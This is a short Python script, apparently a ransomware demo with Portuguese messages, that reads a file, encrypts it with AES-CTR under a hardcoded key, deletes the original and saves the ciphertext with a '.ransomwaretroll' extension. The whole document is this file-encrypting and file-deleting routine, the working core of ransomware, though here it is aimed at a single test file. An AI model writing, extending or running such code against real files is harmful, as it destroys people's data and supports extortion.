import os
import pyaes

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    encrypted_data = aes.encrypt(data)

    os.remove(file_path)

    encrypted_path = file_path + '.ransomwaretroll'
    with open(encrypted_path, 'wb') as f:
        f.write(encrypted_data)

    print(f"Arquivo criptografado: {encrypted_path}")

if __name__ == "__main__":
    encrypt_file("teste.txt", b"testeransomwares")
